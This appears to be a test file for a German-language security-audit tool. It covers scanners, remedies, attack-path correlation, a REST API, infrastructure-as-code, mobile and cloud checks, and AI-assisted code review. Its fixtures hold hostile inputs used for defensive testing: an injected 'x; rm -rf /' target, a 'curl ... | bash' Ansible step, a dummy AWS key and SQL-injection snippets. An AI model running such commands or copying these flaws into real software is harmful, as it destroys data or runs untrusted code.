    check('static: Compose privileged + Socket + DB-Port', ['container-privileged', 'container-docker-sock', 'container-db-port-public'].every((x) => ids.has(x)));
    check('static: Dockerfile latest + root', ids.has('docker-latest-tag') && ids.has('dockerfile-root-user'));
    check('static: GHA unpinned/write-all/pwn-request', ['gha-unpinned-action', 'gha-write-all', 'gha-pull-request-target'].every((x) => ids.has(x)));
    check('static: SHA-gepinnte Action nicht gemeldet', r.findings.filter((f) => f.ruleId === 'gha-unpinned-action').length === 1);
    check('static: SAST-Regeln', ['sast-insecure-random', 'sast-timing-compare', 'sast-jwt-decode-no-verify', 'sast-mass-assignment', 'sast-ssrf'].every((x) => ids.has(x)));
    check('static: sicherer Code ohne SAST-Befund', !r.findings.some((f) => /safe\.js/.test(f.location)));
    check('static: LLM Prompt-Injection + Senke', ids.has('llm-prompt-injection-concat') && ids.has('llm-output-to-sink'));
    check('static: sshd Root-Login, aber nicht Passwort', ids.has('ssh-root-login') && !ids.has('ssh-password-auth'));
  }

  console.log('Lösungswissen & Links:');
  {
    const { enrichRemedy, versionPatch, isAllowedLink } = require('../src/core/remedies');
    const { normalizeFinding: nf } = require('../src/core/schema');
    const vp = versionPatch({ ecosystem: 'npm', name: 'lodash', version: '4.17.15', fixed: '4.17.21' });
    check('remedy: npm-Versions-Patch', vp.command === 'npm install lodash@^4.17.21' && /"\^4\.17\.21"/.test(vp.manifest));
    check('remedy: pip (trivy-Typ) -> PyPI', /pip install --upgrade "django>=4.2.8"/.test(versionPatch({ ecosystem: 'pip', name: 'django', version: '4.2.1', fixed: '4.2.8' }).command));
    const cve = enrichRemedy(nf({ title: 'Verwundbare Abhaengigkeit: lodash 4.17.15 (CVE-2020-8203)', severity: 'high', category: 'Dependencies', package: { ecosystem: 'npm', name: 'lodash', version: '4.17.15', fixed: '4.17.21' } }, 'osv'));
    check('remedy: CVE mit NVD/heise/Video-Links + Patch', cve.versionPatch && ['nvd.nist.gov', 'heise.de', 'youtube.com'].every((h) => cve.links.some((l) => l.url.includes(h))));
    const hsts = enrichRemedy(nf({ ruleId: 'missing-hsts-header', title: 'HSTS-Header fehlt', category: 'Transport' }, 'webscan'));
    check('remedy: HSTS mit Erklärung, Schritten, nginx-Schnipsel', !!hsts.explanation && hsts.steps.length >= 2 && /add_header Strict-Transport-Security/.test(hsts.snippets.nginx));
    check('remedy: alle Links erlaubt', [...cve.links, ...hsts.links].every((l) => isAllowedLink(l.url)));
    check('remedy: fremder Link blockiert', !isAllowedLink('https://evil.example/x') && !isAllowedLink('http://heise.de/'));
    const unknown = ['container-privileged', 'gha-write-all', 'sast-ssrf', 'llm-server-exposed', 'dns-dangling-cname', 'dom-token-in-storage', 'api-bola-cross-tenant', 'toxic-db-breach', 'cookie-missing-httponly-session', 'web-sourcemap-exposed', 'exposed-env']
      .filter((id) => !enrichRemedy(nf({ ruleId: id, title: id, category: 'Config' }, 'x')).explanation);
    check('remedy: Wissensbasis deckt alle Modul-Regeln ab', unknown.length === 0);
  }

  console.log('Threat-Intel, Risiko, Angriffspfade:');
  {
    const { applyIntel, contextualRisk, correlate } = require('../src/core/intel');
    const { normalizeFinding: nf } = require('../src/core/schema');
    const intel = { kev: new Set(['CVE-2021-44228']), epss: new Map([['CVE-2021-44228', [0.97, 0.999]], ['CVE-2020-8203', [0.02, 0.8]]]) };
    const [log4j, lodash] = applyIntel([nf({ title: 'log4j (CVE-2021-44228)', severity: 'critical', cvss: 10, category: 'Dependencies' }, 'osv'), nf({ title: 'lodash (CVE-2020-8203)', severity: 'high', cvss: 7.4, category: 'Dependencies' }, 'osv')], intel);
    check('intel: KEV + EPSS übernommen', log4j.inCisaKev && log4j.epssScore === 0.97 && !lodash.inCisaKev);
    check('risk: KEV mind. 95', contextualRisk(log4j) === 100 && contextualRisk({ ...lodash, cvss: 3, inCisaKev: true }) === 95);
    check('risk: intern x0.75, Testcode x0.4', contextualRisk(lodash, { internetExposed: false }) === 55.5 && contextualRisk({ ...lodash, devOnly: true }) === 29.6);
    const T = (ruleId, extra = {}) => nf({ ruleId, title: ruleId, severity: 'high', category: 'Config', location: 'x:' + ruleId.length, ...extra }, 'container-host-audit');
    const chains = correlate([T('container-root-user'), T('container-docker-sock'), T('sast-ssrf', { category: 'SSRF' }), T('container-db-port-public')]);
    check('correlate: Container-Ausbruch erkannt (100)', chains.some((c) => c.ruleId === 'toxic-container-escape' && c.contextualRiskScore === 100 && c.linkedKeys.length >= 3));
    check('correlate: DB-Kette ohne Firewall-Befund nicht', !chains.some((c) => c.ruleId === 'toxic-db-breach'));

    // Sitzungsübernahme: nur mit echtem Anmelde-Cookie, ohne echte XSS-Lücke nur "möglich"
    const W = (ruleId, title, extra = {}) => nf({ ruleId, title, severity: 'medium', category: 'Config', location: 'https://shop.example/', ...extra }, 'webscan');
    const csp = W('missing-csp-header', 'Kein Schutz gegen eingeschleuste Skripte (Content-Security-Policy fehlt)');
    const tracking = correlate([csp, W('cookie-missing-httponly-_ga', 'Cookie „_ga“ ist für Skripte lesbar')]);
    check('correlate: Tracking-Cookie ergibt keinen Angriffsweg', !tracking.some((c) => c.ruleId === 'toxic-session-hijack'));
    const [possible] = correlate([csp, W('cookie-missing-httponly-phpsessid', 'Cookie „PHPSESSID“ ist für Skripte lesbar')]);
    check('correlate: ohne XSS-Lücke nur "möglich" und abgeschwächt', possible && /^Möglicher Angriffsweg/.test(possible.title) && possible.severity === 'medium' && possible.contextualRiskScore < 70);
    check('correlate: nennt das konkrete Cookie und den Host', /PHPSESSID/.test(possible.description) && /shop\.example/.test(possible.description));
    const [real] = correlate([csp, W('xss-reflected', 'Reflektiertes XSS im Suchfeld', { category: 'XSS' }), W('cookie-missing-httponly-session', 'Cookie „session“ ist für Skripte lesbar')]);
    check('correlate: mit echter XSS-Lücke bestätigt', real && /^Angriffsweg/.test(real.title) && real.severity === 'high');
    check('correlate: Schritte konkret, leichtester zuerst', real.steps.length === 2 && /^Am schnellsten: .*HttpOnly/.test(real.steps[0]) && real.steps.every((s) => /Befund: „/.test(s)));

    // Verständliche Sprache: keine Zählmarken, kein Jargon, keine Ersatz-Umlaute, keine Verweise ins Leere
    const { KB } = require('../src/core/remedies');
    const BAD = [/\(\d+×\)/, /\bSenke\b/, /\bGlied\b/, /\bunten\b/, /\b(ueber|fuer|koenn|moeglich|Schluessel|Aenderung|unnoetig|verschluessel|gueltig|eingeschraenkt|laeuft)/i];
    const texts = [
      ...[possible, real, ...chains].flatMap((c) => [c.title, c.description, c.impact, c.explanation, ...(c.steps || [])]),
      ...KB.flatMap((k) => [k.explanation, ...(k.steps || [])]),
    ].filter(Boolean);
    const offenders = texts.filter((t) => BAD.some((re) => re.test(t)));
    check('sprache: Angriffswege und Wissensbasis ohne Jargon/Zählmarken', offenders.length === 0);
    if (offenders.length) console.log('    ' + offenders.slice(0, 5).join('\n    '));
    const webSrc = require('fs').readFileSync(require('path').join(__dirname, '../src/core/webscan.js'), 'utf8');
    const webTexts = [...webSrc.matchAll(/(?:title|description|impact|remediation): [`'"]([^`'"]+)/g)].map((m) => m[1]);
    const webBad = webTexts.filter((t) => BAD[4].test(t));
    check('sprache: Web-Check-Texte mit echten Umlauten', webBad.length === 0);
    if (webBad.length) console.log('    ' + webBad.slice(0, 5).join('\n    '));
  }

  console.log('Baseline, SBOM, Verifizierung, Backoff:');
  {
    const store = require('../src/core/store');
    const { normalizeFinding: nf } = require('../src/core/schema');
    const db = store.emptyStore();
    const tgt = [{ type: 'path', value: 'C:\\shop' }];
    const ran = [{ target: 'C:\\shop', source: 'prescan' }];
    const A = nf({ ruleId: 'a', title: 'A', location: 'shop/a.js:1', severity: 'high', category: 'Secrets' }, 'prescan');
    const B = nf({ ruleId: 'b', title: 'B', location: 'shop/b.js:1', severity: 'low', category: 'Secrets' }, 'prescan');
    const r1 = store.applyRun(db, { targets: tgt, findings: [A], scannersRun: ran, sbom: [{ ecosystem: 'npm', name: 'lodash', version: '4.17.15' }] });
    const bl = store.setBaseline(db, r1.targetIds[0]);
    store.applyRun(db, { targets: tgt, findings: [A, B], scannersRun: ran });
    check('baseline: Altlast markiert, Neues nicht', bl.count === 1 && store.listFindings(db, { newSinceBaseline: true }).map((f) => f.ruleId).join() === 'b');
    check('sbom: Paket + Version gefunden', store.searchSbom(db, 'lodash@4.17').length === 1 && store.searchSbom(db, 'lodash@5').length === 0);
    check('store: Ziel hat Verifizierungs-Token', /^[a-f0-9]{24}$/.test(db.targets[r1.targetIds[0]].verificationToken));
    check('stats: Sicherheitswert berechnet', typeof store.stats(db).posture === 'number');

    const { verifyOwnership } = require('../src/core/scope');
    const okDns = await verifyOwnership({ type: 'url', value: 'https://shop.example.com' }, 'tok123', { resolveTxt: async (n) => (n === '_sec-audit-verify.example.com' ? [['tok123']] : []), fetchImpl: async () => ({ ok: false }) });
    const bad = await verifyOwnership({ type: 'url', value: 'https://shop.example.com' }, 'tok123', { resolveTxt: async () => [['falsch']], fetchImpl: async () => ({ ok: true, text: async () => 'anderes' }) });
    const wk = await verifyOwnership({ type: 'url', value: 'https://x.example' }, 'tok9', { resolveTxt: async () => { throw new Error('nx'); }, fetchImpl: async () => ({ ok: true, text: async () => 'tok9\n' }) });
    check('verify: DNS-TXT, .well-known, Ablehnung', okDns.ok && okDns.method === 'dns' && wk.ok && wk.method === 'well-known' && !bad.ok);
    check('verify: interne Adresse ohne Nachweis', (await verifyOwnership({ type: 'endpoint', value: '192.168.1.4' }, 'x')).ok);

    const { WafGuard } = require('../src/core/modules/web');
    const g = new WafGuard(1000);
    let threw = false;
    try { g.after('h', 429); g.after('h', 200); g.after('h', 503); g.after('h', 403); g.after('h', 429); } catch (e) { threw = e.throttled; }
    check('backoff: erst bei 3 Sperren in Folge', threw === true);

    const report = require('../src/core/report');
    const j = JSON.parse(report.toJson({ summary: { total: 1, counts: {} }, findings: [{ ...A, contextualRiskScore: 80 }], meta: {} }, { posture: 70, open: {}, toxic: [], kev: 0, newSinceBaseline: 1 }));
    check('report: JSON mit Sicherheitswert', j.posture.score === 70 && j.findings[0].contextualRiskScore === 80);
  }

  console.log('REST-API:');
  {
    const os = require('os'); const path = require('path'); const fs = require('fs');
    const { createOrchestrator } = require('../electron/orchestrator');
    const { createApi } = require('../electron/api');
    const { enforceScope } = require('../src/core/scope');
    const file = path.join(os.tmpdir(), `vigil-test-store-${process.pid}.json`);
    const fakeAudit = async (targets) => ({ result: { findings: [normalizeTestFinding()], summary: { total: 1, counts: { medium: 1 } }, errors: [], meta: { scannersRun: targets.map((t) => ({ target: t.value, source: 'webscan' })) } } });
    function normalizeTestFinding() { return require('../src/core/schema').normalizeFinding({ ruleId: 'missing-csp-header', title: 'CSP fehlt', severity: 'medium', category: 'Config', location: 'https://ok.example/' }, 'webscan'); }
    const orch = createOrchestrator({ storeFile: file, runAudit: fakeAudit, buildConfig: () => ({}) });
    const cfg = { apiToken: 'test-token-123', allowlist: ['ok.example'], selected: 'ollama' };
    const api = createApi({ orchestrator: orch, getConfig: () => cfg, enforceScope });
    // Port 0: das System vergibt direkt einen freien Port (kein Wettlauf zwischen Suchen und Belegen)
    const started = await api.start(0); const freePort = started.port;
    check('api: startet auf 127.0.0.1', started.ok && freePort > 0);
    const url = (p) => `http://127.0.0.1:${freePort}${p}`;
    const H = { Authorization: 'Bearer test-token-123', 'Content-Type': 'application/json' };
    check('api: ohne Token 401', (await fetch(url('/api/stats'))).status === 401);
    check('api: falsches Token 401', (await fetch(url('/api/stats'), { headers: { Authorization: 'Bearer nope' } })).status === 401);
    const bad = await fetch(url('/api/scans'), { method: 'POST', headers: H, body: JSON.stringify({ targets: [{ type: 'url', value: 'https://evil.example' }] }) });
    check('api: Ziel ausserhalb der Freigabe 403', bad.status === 403);
    const inv = await fetch(url('/api/scans'), { method: 'POST', headers: H, body: JSON.stringify({ targets: [{ type: 'image', value: 'x; rm -rf /' }] }) });
    check('api: ungueltige Eingabe 400', inv.status === 400);
    const ok = await fetch(url('/api/scans'), { method: 'POST', headers: H, body: JSON.stringify({ targets: [{ type: 'url', value: 'https://ok.example/' }] }) });
    const { scanId } = await ok.json();
    check('api: Scan angenommen 202', ok.status === 202 && !!scanId);
    for (let i = 0; i < 50 && orch.getRun(scanId).status !== 'COMPLETED'; i++) await new Promise((r) => setTimeout(r, 20));
    check('api: Lauf COMPLETED', (await (await fetch(url('/api/scans/' + scanId), { headers: H })).json()).status === 'COMPLETED');
    const list = await (await fetch(url('/api/findings?status=OPEN'), { headers: H })).json();
    check('api: Befund gespeichert', list.findings.length === 1 && list.findings[0].ruleId === 'missing-csp-header');
    const patch = await fetch(url(`/api/findings/${list.findings[0].id}/status`), { method: 'PATCH', headers: H, body: JSON.stringify({ status: 'ACCEPTED_RISK' }) });
    check('api: Status aendern', patch.status === 200 && (await patch.json()).finding.status === 'ACCEPTED_RISK');
    check('api: Browser-Origin abgewiesen', (await fetch(url('/api/stats'), { headers: { ...H, Origin: 'https://evil.example' } })).status === 403);
    await api.stop();
    try { fs.unlinkSync(file); } catch { /* egal */ }
  }

  // --- Dauer-Schaetzung lernt aus echten Laeufen ---
  {
    const t = require('../src/core/timing');
    const cfg = { provider: 'ollama', model: 'm', aiValidation: true };
    const inp = { targets: [{ type: 'path' }], files: 40, deps: 10, calls: 2, local: true, config: cfg };
    const before = t.estimate(inp, {});
    check('timing: ohne Messung vorsichtig (>= 2 Min. fuer 2 lokale Aufrufe)', before.seconds >= 120 && !before.measured);
    let now = 0; const clk = new t.PhaseClock(() => now);
    clk.tick({ phase: 'prescan' }); now += 5000;
    clk.tick({ phase: 'analyze', total: 2, done: 0 }); now += 150000; clk.tick({ phase: 'analyze', total: 2, done: 1 }); now += 150000; clk.tick({ phase: 'analyze', total: 2, done: 2 });
    clk.tick({ phase: 'validate', total: 1, done: 0 }); now += 45000; clk.tick({ phase: 'validate', total: 1, done: 1 });
    const m = clk.finish();
    check('timing: Phasen gemessen', Math.round(m.total) === 350 && m.aiCalls === 2 && m.validateCalls === 1);
    const after = t.estimate(inp, t.learn({}, m, { ...inp }));
    check('timing: nach einem 6-Min-Lauf schaetzt Vigil ~6 Min.', after.measured && Math.abs(after.seconds - 350) < 40);
    const web = t.estimate({ targets: [{ type: 'url' }], config: {} }, {});
    check('timing: Webadresse ohne KI nicht unter einer Minute', web.seconds >= 60);
  }

  // --- Server-Einrichtung als Code, Lizenzen, weitere Sprachen, Git-Historie ---
  {
    const { runIac } = require('../src/core/modules/iac');
    const { runLicense, conflict } = require('../src/core/modules/license');
    const { runLangs } = require('../src/core/modules/langs');
    const { scanLog } = require('../src/core/githistory');
    const U = (label, content) => ({ label, content, kind: 'file' });
    const tf = U('infra/main.tf', 'resource "aws_s3_bucket" "logs" {\n  bucket = "x"\n  acl    = "public-read"\n}\nresource "aws_security_group" "web" {\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    cidr_blocks = ["0.0.0.0/0"]\n  }\n}\nresource "aws_db_instance" "db" {\n  publicly_accessible = true\n  password = "SuperGeheim123"\n}\n');
    const ids = runIac([tf]).map((f) => f.ruleId);
    check('iac: Terraform – offener Bucket, SSH offen, DB öffentlich, Passwort', ['iac-s3-public-acl', 'iac-sg-open-admin', 'iac-db-public', 'iac-db-unencrypted', 'iac-hardcoded-secret'].every((x) => ids.includes(x)));
    check('iac: Zeile stimmt', runIac([tf]).find((f) => f.ruleId === 'iac-s3-public-acl').location === 'infra/main.tf:3');
    const k8s = U('k8s/app.yaml', 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: shop\nspec:\n  template:\n    spec:\n      hostNetwork: true\n      containers:\n        - name: shop\n          image: shop:latest\n          securityContext:\n            privileged: true\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: shop\n');
    const kid = runIac([k8s]).map((f) => f.ruleId);
    check('iac: Kubernetes – privileged, hostNetwork, latest, keine Limits', ['k8s-privileged', 'k8s-hostnetwork', 'k8s-image-latest', 'k8s-no-limits'].every((x) => kid.includes(x)));
    const safe = U('k8s/ok.yaml', 'apiVersion: v1\nkind: Pod\nmetadata:\n  name: ok\nspec:\n  securityContext:\n    runAsNonRoot: true\n  containers:\n    - name: a\n      image: nginx:1.27.2\n      resources:\n        limits:\n          cpu: 100m\n');
    check('iac: sauberes Pod-Manifest ohne Befund', runIac([safe]).length === 0);
    const ans = U('playbook.yml', '- hosts: web\n  tasks:\n    - name: install\n      shell: curl https://x.sh | bash\n    - name: set db password\n      mysql_user: password=abc\n');
    const aid = runIac([ans]).map((f) => f.ruleId);
    check('iac: Ansible – curl|bash und Passwort ohne no_log', aid.includes('ansible-curl-pipe-sh') && aid.includes('ansible-secret-logged'));
    check('lizenz: GPL in MIT-Projekt ist Konflikt, AGPL hoch', conflict('GPL-3.0', 'MIT').severity === 'medium' && conflict('AGPL-3.0', 'MIT').severity === 'high');
    check('lizenz: MIT OR GPL ist kein Konflikt, LGPL auch nicht', !conflict('MIT OR GPL-3.0', 'MIT') && !conflict('LGPL-2.1', 'MIT'));
    check('lizenz: GPL in GPL-Projekt ok', !conflict('GPL-3.0', 'GPL-3.0'));
    const pj = U('app/package.json', JSON.stringify({ name: 'a', license: 'MIT', dependencies: { foo: '1', bar: '1' } }));
    const lock = U('app/package-lock.json', JSON.stringify({ packages: { '': {}, 'node_modules/foo': { version: '1.0.0', license: 'AGPL-3.0' }, 'node_modules/bar': { version: '2.0.0', license: 'MIT' }, 'node_modules/baz': { version: '1.0.0' } } }));
    const lic = runLicense([pj, lock]);
    check('lizenz: AGPL-Paket gemeldet, MIT nicht, fehlende Lizenz gesammelt', lic.some((f) => f.ruleId === 'license-copyleft' && /foo/.test(f.title) && f.severity === 'high') && !lic.some((f) => /„bar“/.test(f.title)) && lic.some((f) => f.ruleId === 'license-unknown' && f.category === 'License'));
    const langs = runLangs([
      U('srv/db.go', 'package x\nimport "fmt"\nfunc q(id string){ db.Query(fmt.Sprintf("SELECT * FROM u WHERE id=%s", id)) }\nvar c = &tls.Config{InsecureSkipVerify: true}\n'),
      U('web/index.php', '<?php echo $_GET["name"]; mysqli_query($c, "SELECT * FROM u WHERE id=" . $_GET["id"]);'),
      U('App/Data.cs', 'var cmd = new SqlCommand("SELECT * FROM u WHERE n=\'" + name + "\'", con);\nvar f = new BinaryFormatter();'),
      U('app/Main.kt', 'db.rawQuery("SELECT * FROM u WHERE id=" + id, null)'),
      U('ios/Info.plist', '<key>NSAllowsArbitraryLoads</key>\n<true/>'),
      U('src/main.rs', 'let c = Client::builder().danger_accept_invalid_certs(true).build();'),
    ]).map((f) => f.ruleId);
    check('sprachen: Go, PHP, C#, Kotlin, Swift/iOS, Rust', ['go-sql-concat', 'go-insecure-tls', 'php-xss-echo', 'php-sql-concat', 'cs-sql-concat', 'cs-binaryformatter', 'kt-sql-concat', 'ios-ats-disabled', 'rust-insecure-tls'].every((x) => langs.includes(x)));
    const log = '@@C abc1234def|Mia|2025-03-01\ndiff --git a/.env b/.env\n+++ b/.env\n+AWS_KEY=AKIAABCDEFGHIJKLMNOP\n@@C 999|Mia|2025-03-02\n+++ /dev/null\n';
    const hits = scanLog(log);
    check('git-historie: alter AWS-Schlüssel mit Datei und Commit', hits.length === 1 && hits[0].file === '.env' && hits[0].commit.hash === 'abc1234def');
  }

  // --- Handy-Apps und System-Pruefungen ---
  {
    const { decodeAxml, decodeBplist, runMobile } = require('../src/core/modules/mobile');
    const h = require('../src/core/hostaudit');
    // Minimales binaeres AndroidManifest (UTF-16-Stringpool, zwei Elemente) zusammenbauen
    const strs = ['manifest', 'application', 'debuggable', 'usesCleartextTraffic', 'activity', 'exported', 'name', '.AdminActivity'];
    const enc = strs.map((s) => { const b = Buffer.alloc(2 + s.length * 2 + 2); b.writeUInt16LE(s.length, 0); b.write(s, 2, 'utf16le'); return b; });
    const offs = []; let o = 0; for (const e of enc) { offs.push(o); o += e.length; }
    const poolData = Buffer.concat(enc); const pad = (4 - (poolData.length % 4)) % 4;
    const poolHdr = Buffer.alloc(28 + strs.length * 4);
    poolHdr.writeUInt16LE(0x0001, 0); poolHdr.writeUInt16LE(28, 2); poolHdr.writeUInt32LE(strs.length, 8); poolHdr.writeUInt32LE(0, 16); poolHdr.writeUInt32LE(28 + strs.length * 4, 20);
    offs.forEach((x, i) => poolHdr.writeUInt32LE(x, 28 + i * 4));
    const pool = Buffer.concat([poolHdr, poolData, Buffer.alloc(pad)]); pool.writeUInt32LE(pool.length, 4);
    const el = (name, attrs) => { const b = Buffer.alloc(36 + attrs.length * 20); b.writeUInt16LE(0x0102, 0); b.writeUInt16LE(16, 2); b.writeUInt32LE(b.length, 4); b.writeInt32LE(-1, 16); b.writeUInt32LE(name, 20); b.writeUInt16LE(20, 24); b.writeUInt16LE(20, 26); b.writeUInt16LE(attrs.length, 28);
      attrs.forEach(([n, val, str], i) => { const a = 36 + i * 20; b.writeInt32LE(-1, a); b.writeUInt32LE(n, a + 4); b.writeInt32LE(str ?? -1, a + 8); b.writeUInt16LE(8, a + 12); b[a + 15] = str != null ? 0x03 : 0x12; b.writeUInt32LE(str ?? (val ? 0xffffffff : 0), a + 16); }); return b; };
    const end = (name) => { const b = Buffer.alloc(24); b.writeUInt16LE(0x0103, 0); b.writeUInt16LE(16, 2); b.writeUInt32LE(24, 4); b.writeInt32LE(-1, 16); b.writeUInt32LE(name, 20); return b; };
    const body = Buffer.concat([pool, el(0, []), el(1, [[2, true], [3, true]]), el(4, [[6, 0, 7], [5, true]]), end(4), end(1), end(0)]);
    const head = Buffer.alloc(8); head.writeUInt16LE(0x0003, 0); head.writeUInt16LE(8, 2); head.writeUInt32LE(8 + body.length, 4);
    const xml = decodeAxml(Buffer.concat([head, body]));
    check('mobil: binäres Android-Manifest wird lesbar', /<application android:debuggable="true" android:usesCleartextTraffic="true">/.test(xml || '') && /android:name="\.AdminActivity"/.test(xml));
    const mids = runMobile([{ label: 'app.apk!/AndroidManifest.xml', content: xml }]).map((f) => f.ruleId);
    check('mobil: Debug, Klartext und offener Bildschirm erkannt', ['android-debuggable', 'android-cleartext', 'android-exported-component'].every((x) => mids.includes(x)));
    // bplist00: { NSAppTransportSecurity: true }
    const bp = Buffer.concat([Buffer.from('bplist00'), Buffer.from([0xd1, 0x01, 0x02]), Buffer.from([0x56]), Buffer.from('UIFile'), Buffer.from([0x09])]);
    const offsTable = Buffer.from([8, 11, 18]);
    const trailer = Buffer.alloc(32); trailer[6] = 1; trailer[7] = 1; trailer.writeBigUInt64BE(3n, 8); trailer.writeBigUInt64BE(0n, 16); trailer.writeBigUInt64BE(BigInt(bp.length), 24);
    check('mobil: binäre Info.plist wird lesbar', /<key>UIFile<\/key>\s*<true\/>/.test(decodeBplist(Buffer.concat([bp, offsTable, trailer])) || ''));
    const w = h.parseWindows({ defender: { av: true, rt: false }, firewall: [{ name: 'Public', enabled: false }, { name: 'Private', enabled: true }], bitlocker: 2, lastUpdateDays: 120, uac: 1, rdpDeny: 0, rdpNla: 0, smb1: true, guest: false }).map((f) => f.ruleId);
    check('windows: Virenschutz, Firewall, BitLocker, Updates, RDP, SMBv1', ['win-defender-off', 'win-firewall-off', 'win-bitlocker-off', 'win-updates-old', 'win-rdp-no-nla', 'win-smb1'].every((x) => w.includes(x)) && !w.includes('win-uac-off'));
    check('windows: sauberer PC ohne Befund', h.parseWindows({ defender: { av: true, rt: true, age: 1, tamper: true }, firewall: [{ name: 'Public', enabled: true }], bitlocker: 1, lastUpdateDays: 10, uac: 1, rdpDeny: 1, smb1: false, guest: false }).length === 0);
    const d = h.parseDocker([{ Name: '/db', Config: { User: '' }, HostConfig: { Privileged: true, PortBindings: { '5432/tcp': [{ HostIp: '', HostPort: '5432' }] } }, Mounts: [{ Source: '/var/run/docker.sock' }] }]).map((f) => f.ruleId);
    check('docker: privilegiert, Socket, offener DB-Port, root', ['container-privileged', 'container-docker-sock', 'container-db-port-public', 'container-root-user'].every((x) => d.includes(x)));
    const aws = h.parseAws({ summary: { SummaryMap: { AccountMFAEnabled: 0, AccountAccessKeysPresent: 0 } }, passwordPolicy: null, buckets: [{ name: 'b1', isPublic: true }], groups: [{ GroupId: 'sg-1', GroupName: 'web', IpPermissions: [{ IpProtocol: 'tcp', FromPort: 3389, ToPort: 3389, IpRanges: [{ CidrIp: '0.0.0.0/0' }] }] }] }).map((f) => f.ruleId);
    check('aws: root ohne MFA, keine Passwortregel, offener Bucket, RDP offen', ['aws-root-no-mfa', 'aws-no-password-policy', 'cloud-bucket-public', 'cloud-firewall-open'].every((x) => aws.includes(x)));
    const az = h.parseAzure({ storage: [{ name: 's1', allowBlobPublicAccess: true, minimumTlsVersion: 'TLS1_0' }], nsgs: [{ name: 'n', securityRules: [{ name: 'ssh', direction: 'Inbound', access: 'Allow', sourceAddressPrefix: '*', destinationPortRange: '22' }] }] }).map((f) => f.ruleId);
    check('azure: öffentlicher Speicher, altes TLS, SSH offen', ['cloud-bucket-public', 'iac-azure-old-tls', 'cloud-firewall-open'].every((x) => az.includes(x)));
    const gcp = h.parseGcp({ buckets: [{ name: 'g', public: true }], firewalls: [{ name: 'f', direction: 'INGRESS', sourceRanges: ['0.0.0.0/0'], allowed: [{ IPProtocol: 'tcp', ports: ['20-25'] }] }] }).map((f) => f.ruleId);
    check('gcp: öffentlicher Bucket, Firewall offen', gcp.includes('cloud-bucket-public') && gcp.includes('cloud-firewall-open'));
    const { TargetSchema } = require('../src/core/validation');
    check('system: nur bekannte System-Prüfungen erlaubt', !!TargetSchema && TargetSchema.safeParse({ type: 'system', value: 'windows' }).success && !TargetSchema.safeParse({ type: 'system', value: 'rm -rf' }).success);
  }

  // --- KI: nur Geaendertes, Vorsortierung, zwei Modelle, Fehlalarme lernen, Prompt-Cache ---
  {
    const http = require('http');
    const { analyze, consensus } = require('../src/core/analyze');
    let calls = [];
    const srv = http.createServer((req, res) => {
      let body = ''; req.on('data', (d) => { body += d; }); req.on('end', () => {
        const j = JSON.parse(body); calls.push(j);
        const sys = j.messages[0].content, user = j.messages[1].content;
        let content;
        if (/sortierst Quelltext/.test(sys)) content = JSON.stringify({ suspicious: ['proj/db.js'] });
        else content = JSON.stringify({ findings: /db\.js/.test(user) ? [{ title: 'SQL-Injection in getUser', severity: 'high', category: 'Injection', location: 'proj/db.js:2', description: 'x', remediation: 'y', confidence: 'medium' }] : [] });
        res.setHeader('Content-Type', 'application/json'); res.end(JSON.stringify({ message: { content }, prompt_eval_count: 100, eval_count: 20 }));
      });
    });
    await new Promise((r) => srv.listen(0, '127.0.0.1', r));
    const base = `http://127.0.0.1:${srv.address().port}`;
    const mem = {}; const cache = { get: (k) => mem[k], set: (k, v) => { mem[k] = v; } };
    const units = [{ label: 'proj/db.js', kind: 'file', language: 'javascript', content: 'const q = "SELECT * FROM u WHERE id=" + req.query.id;\ndb.query(q);' }, { label: 'proj/style.js', kind: 'file', language: 'javascript', content: 'export const color = "red";' }];
    const cfg = { provider: 'ollama', model: 'big', baseUrl: base, analysisDepth: 'standard', aiValidation: false, aiCache: cache };
    const r1 = await analyze({ units, config: cfg });
    const n1 = calls.length;
    check('ki-cache: erster Lauf fragt die KI', n1 >= 1 && r1.findings.some((f) => /SQL-Injection/.test(f.title)));
    const r2 = await analyze({ units, config: cfg });
    check('ki-cache: unveränderter zweiter Lauf ohne KI-Aufruf, gleicher Befund', calls.length === n1 && r2.meta.fromCache === 2 && r2.findings.some((f) => /SQL-Injection/.test(f.title)));
    const changed = [{ ...units[0], content: units[0].content + '\n// geändert' }, units[1]];
    await analyze({ units: changed, config: cfg });
    const sent = calls.slice(n1).map((c) => c.messages[1].content).join('\n');
    check('ki-cache: nur die geänderte Datei geht erneut an die KI', /db\.js/.test(sent) && !/style\.js/.test(sent));
    calls = [];
    const r3 = await analyze({ units, config: { ...cfg, aiCache: null, triageModel: 'tiny' } });
    const mainSent = calls.filter((c) => c.model === 'big').map((c) => c.messages[1].content).join('\n');
    check('vorsortierung: kleines Modell siebt unauffällige Datei aus', calls.some((c) => c.model === 'tiny') && /db\.js/.test(mainSent) && !/style\.js/.test(mainSent) && r3.meta.skippedByTriage === 1);
    calls = [];
    const r4 = await analyze({ units, config: { ...cfg, aiCache: null, consensusModel: 'second' } });
    check('zwei modelle: beide gefragt, gemeinsamer Fund gilt als sicher', calls.some((c) => c.model === 'second') && r4.findings.some((f) => f.consensus === 'both' && f.confidence === 'high'));
    srv.close();
    const mixed = consensus([{ location: 'a.js:10', category: 'XSS', confidence: 'high' }], [{ location: 'a.js:12', category: 'XSS', confidence: 'medium' }, { location: 'b.js:1', category: 'Auth', confidence: 'high' }], ['A', 'B']);
    check('zwei modelle: Einzelfund wird heruntergestuft', mixed.length === 2 && mixed[0].consensus === 'both' && mixed[1].consensus === 'only:B' && mixed[1].confidence === 'medium');
    const st = require('../src/core/store');
    const db = st.emptyStore();
    const tg = [{ type: 'path', value: 'C:/p' }];
    const first = st.applyRun(db, { targets: tg, findings: [{ ruleId: 'sql-injection-in-getuser', title: 'SQL-Injection in getUser', location: 'p/db.js:2', category: 'Injection', severity: 'high', source: 'ai' }], scannersRun: [] });
    st.setStatus(db, first.findings[0].id, 'FALSE_POSITIVE');
    const again = st.applyRun(db, { targets: tg, findings: [{ ruleId: 'sql-injection-in-getuser', title: 'SQL-Injection in getUser', location: 'p/db.js:7', category: 'Injection', severity: 'high', source: 'ai' }], scannersRun: [] });
    check('fehlalarm lernen: gleicher Befund an anderer Zeile bleibt ausgeblendet', again.findings[0].status === 'FALSE_POSITIVE' && again.findings[0].suppressed && again.counters.learned === 1);
    check('fehlalarm lernen: Hinweisliste für die KI', st.falsePositivesFor(db, [first.findings[0].targetId]).length >= 1);
    const { estimateCost } = require('../src/core/cost');
